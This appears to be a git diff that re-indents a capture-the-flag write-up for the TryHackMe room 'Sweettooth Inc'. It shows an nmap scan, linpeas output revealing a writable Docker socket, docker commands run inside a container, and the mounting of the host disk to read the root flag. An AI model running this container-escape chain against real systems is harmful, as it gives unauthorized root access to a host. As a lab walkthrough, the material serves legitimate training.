@@ -40,38 +40,38 @@ description: TryHackMe Room Sweettooth Inc solved by Animesh Roy. Sweettooth Inc
 
 - nmap (basic scan)
 
-```bash
-sudo nmap -sC -sV -oN nmap/init 10.10.187.112
-[sudo] password for anir0y: 
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 12:20 IST
-Nmap scan report for 10.10.187.112
-Host is up (0.19s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE VERSION
-111/tcp  open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100024  1          41045/udp   status
-|   100024  1          55132/udp6  status
-|   100024  1          55323/tcp   status
-|_  100024  1          56412/tcp6  status
-2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
-|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
-|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
-|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
-8086/tcp open  http    InfluxDB http admin 1.3.0
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  ```bash
+  sudo nmap -sC -sV -oN nmap/init 10.10.187.112
+  [sudo] password for anir0y: 
+  Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 12:20 IST
+  Nmap scan report for 10.10.187.112
+  Host is up (0.19s latency).
+  Not shown: 997 closed ports
+  PORT     STATE SERVICE VERSION
+  111/tcp  open  rpcbind 2-4 (RPC #100000)
+  | rpcinfo: 
+  |   program version    port/proto  service
+  |   100000  2,3,4        111/tcp   rpcbind
+  |   100000  2,3,4        111/udp   rpcbind
+  |   100000  3,4          111/tcp6  rpcbind
+  |   100000  3,4          111/udp6  rpcbind
+  |   100024  1          41045/udp   status
+  |   100024  1          55132/udp6  status
+  |   100024  1          55323/tcp   status
+  |_  100024  1          56412/tcp6  status
+  2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+  | ssh-hostkey: 
+  |   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
+  |   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
+  |   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
+  |_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
+  8086/tcp open  http    InfluxDB http admin 1.3.0
+  |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
-```
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
+  ```
 
 ### 2.1 : Do a TCP portscan. What is the name of the database software running on one of these ports?
 
@@ -224,23 +224,23 @@ Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
 - login to `SSH`
 - run linpeas to find out running services.
 
-```bash
-# intresting findings
+    ```bash
+    # intresting findings
 
-# Docker Container details
+    # Docker Container details
 
-You have write permissions over Docker socket `/run/docker.sock`                                                        
+    You have write permissions over Docker socket `/run/docker.sock`                                                        
 
-Container ID ╣ 
-Container Full ID : 7d5a0b6ac4900c50223626d27a81978a5b2a0641ca7e50002512a120be0394d1
+    Container ID ╣ 
+    Container Full ID : 7d5a0b6ac4900c50223626d27a81978a5b2a0641ca7e50002512a120be0394d1
 
-╣ Cleaned processes
-╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-root         1  0.0  0.2  20048  2796 ?        Ss   10:20   0:00 /bin/bash -c chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd'
+    ╣ Cleaned processes
+    ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+    root         1  0.0  0.2  20048  2796 ?        Ss   10:20   0:00 /bin/bash -c chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd'
 
-root         8  0.0  0.2  44764  2596 ?        S    10:20   0:00 /bin/su uzJk6Ry98d8C -c /initializeandquery.sh & /entrypoint.sh influxd
+    root         8  0.0  0.2  44764  2596 ?        S    10:20   0:00 /bin/su uzJk6Ry98d8C -c /initializeandquery.sh & /entrypoint.sh influxd
 
-```
+    ```
 
   > some kind of Docker things??
 
@@ -275,47 +275,47 @@ root         8  0.0  0.2  44764  2596 ?        S    10:20   0:00 /bin/su uzJk6Ry
 
 - findings
 
-```cat
-Container: 
-Image "sweettoothinc:latest"
-```
+  ```cat
+  Container: 
+  Image "sweettoothinc:latest"
+  ```
 
 - connect Docker Container:
 
-```bash
-# list container 
-docker -H tcp://localhost:8080 container ls   
-                          
-CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS             PORTS                                          NAMES
-7d5a0b6ac490   sweettoothinc:latest   "/bin/bash -c 'chmod…"   50 minutes ago   Up About an hour   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
-```
+  ```bash
+  # list container 
+  docker -H tcp://localhost:8080 container ls   
+                            
+  CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS             PORTS                                          NAMES
+  7d5a0b6ac490   sweettoothinc:latest   "/bin/bash -c 'chmod…"   50 minutes ago   Up About an hour   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
+  ```
 
 - list docker files
 
-```bash
-docker -H tcp://localhost:8080 container exec sweettoothinc ls
-bin
-boot
-dev
-entrypoint.sh
-etc
-home
-initializeandquery.sh
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
-usr
-var
-```
+  ```bash
+  docker -H tcp://localhost:8080 container exec sweettoothinc ls
+  bin
+  boot
+  dev
+  entrypoint.sh
+  etc
+  home
+  initializeandquery.sh
+  lib
+  lib64
+  media
+  mnt
+  opt
+  proc
+  root
+  run
+  sbin
+  srv
+  sys
+  tmp
+  usr
+  var
+  ```
 
 - get a rev shell
 
@@ -364,19 +364,19 @@ var
 
 - mounting `/dev/xvda1`
 
-```bash
-root@7d5a0b6ac490:/# mkdir /mnt/temp
-mkdir /mnt/temp
-root@7d5a0b6ac490:/# mount /dev/xvda1 /mnt/temp
-mount /dev/xvda1 /mnt/temp
+  ```bash
+  root@7d5a0b6ac490:/# mkdir /mnt/temp
+  mkdir /mnt/temp
+  root@7d5a0b6ac490:/# mount /dev/xvda1 /mnt/temp
+  mount /dev/xvda1 /mnt/temp
 
-root@7d5a0b6ac490:/mnt/temp# cd /mnt/temp/
-root@7d5a0b6ac490:/mnt/temp# cd root
-root@7d5a0b6ac490:/mnt/temp/root# cat root*
-cat root*
-THM{flag-was-here}
+  root@7d5a0b6ac490:/mnt/temp# cd /mnt/temp/
+  root@7d5a0b6ac490:/mnt/temp# cd root
+  root@7d5a0b6ac490:/mnt/temp/root# cat root*
+  cat root*
+  THM{flag-was-here}
 
-```
+  ```
 
 ---
 <!-- Google Ads -->
